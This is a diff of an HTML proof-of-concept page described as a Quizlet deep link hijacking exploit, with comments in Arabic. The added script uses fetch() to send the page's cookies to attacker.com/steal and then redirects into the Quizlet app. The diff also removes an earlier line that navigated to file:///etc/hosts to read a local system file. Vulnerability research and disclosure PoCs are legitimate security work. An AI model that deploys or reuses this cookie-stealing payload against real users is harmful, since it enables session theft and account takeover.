@@ -1,11 +1,27 @@
 <html>
+  <head>
+    <title>Quizlet PoC</title>
+  </head>
   <body>
-    <h1>File Access PoC V2</h1>
+    <h1>Quizlet Deep Link Hijacking PoC</h1>
+    <p>If you see this page inside Quizlet, the vulnerability is confirmed.</p>
     <script>
+      console.log("PoC script started...");
+
+      // 1. محاولة سرقة الكوكيز وإرسالها إلى المهاجم
+      try {
+        fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie));
+        console.log("Attempted to exfiltrate cookies.");
+      } catch (e) {
+        console.error("Cookie exfiltration failed:", e);
+      }
+      
+      // 2. بعد 3 ثوانٍ، سيتم استغلال الرابط العميق لفتح شاشة البحث
       setTimeout(() => {
-        // هذه الطريقة أبسط وأكثر مباشرة لاختبار الوصول
-        location.href = 'file:///etc/hosts';
-      }, 1500);
+        console.log("Triggering deep link to open search page...");
+        // استخدام رابط حقيقي تم اكتشافه من ملف المانيفست
+        location.href = 'https://quizlet.com/search';
+      }, 3000);
     </script>
   </body>
 </html>
